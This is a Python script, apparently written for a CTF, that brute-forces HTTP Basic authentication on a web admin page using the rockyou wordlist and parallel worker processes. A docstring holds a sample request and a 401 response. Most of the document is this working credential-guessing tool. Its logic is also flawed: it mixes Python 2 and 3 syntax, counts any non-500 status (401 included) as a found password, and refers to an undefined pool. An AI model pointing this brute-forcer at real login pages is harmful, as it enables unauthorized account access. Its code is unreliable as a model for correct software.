#! /usr/bin/env python

"""
POST /johnny/admin/ HTTP/1.1
Host: web.onlinectf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://web.onlinectf.com/johnny/
DNT: 1
Authorization: Basic YWRtaW46YWNhc2E=
Connection: keep-alive
Upgrade-Insecure-Requests: 1
"""


"""
HTTP/1.1 401 Unauthorized
Date: Sat, 16 Sep 2017 22:28:33 GMT
Content-Type: text/html; charset=iso-8859-1
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: __cfduid=d411d098596d463eb43b24caa6291ed571505600913; expires=Sun, 16-Sep-18 22:28:33 GMT; path=/; domain=.onlinectf.com; HttpOnly
x-frame-options: SAMEORIGIN
WWW-Authenticate: Basic realm="Restricted Area"
Server: cloudflare-nginx
CF-RAY: 39f7426c72b52926-OTP
"""

from http.client import HTTPConnection
from base64 import b64encode
import multiprocessing as mp
import optparse

# by default pass_file is 
# pfile = "/usr/share/wordlists/rockyou.txt"
username    = "admin"
pfile       = "/usr/share/wordlists/rockyou.txt"

def main():
    parser = optparse.OptionParser("usage%prog" +\
                    "-u <username> -p <password_list>")
    parser.add_option( "-u", dest="uname", type="string", \
                    help="specify username")
    parser.add_option( "-p", dest="plist", type="string", \
                    help="specify password list")
    (options, args) = parser.parse_args()
    if (options.uname == None) | (options.plist == None):
        print parser.usage
        username    = "admin"
        pfile       = "/usr/share/wordlists/rockyou.txt"
    else:
        username = options.uname
        pfile    = options.plist

    print "[+] BF for username : {0}".format(username)
    print "[+] Chosen pw list  : {0}".format(pfile)


    N_CPU   = 3
    N       = 64
    pool    = mp.Pool(N_CPU)
    
    print "Multi Starting"
    with open(pfile) as passfile:
        pool.imap_unordered(OpenConnection, (password for password in passfile))
        pool.close()
        pool.join()

def OpenConnection(passwd):
    '''
        worker function which creates HTTP Connection
        if returned status code is other than 500
        it means that auth has taken place 
    '''
    print "[*] Trying {0}".format(passwd)
    conection1      = HTTPConnection("web.onlinectf.com", 80)
    
    #create username:password b64 encode string for HTTP header
    userpass        = bytes(username + ':' + passwd)
    string_userpass = b64encode(userpass).decode('iso-8859-1')
    auth_header     = { 'Authorization' : 'Basic %s' % string_userpass}
    
    #Submitting POST method
    conection1.request('POST', '/johnny/admin', headers=auth_header)
    response = conection1.getresponse()
    
    if response.status != 500:
        print "[-------------------------------------------]"
        print " [+] Password found: {0}".format(passwd)
        print " [+] Auth header: {0}".format(string_userpass)
        return 200


# callback running only in __main__

def quit(arg):
    print "quitting with %g" % arg
    # note: p is visible because it's global in __main__
    pool.terminate()  # kill all pool workers

if __name__ == '__main__':
    main()
    #OpenConnection("Business")
   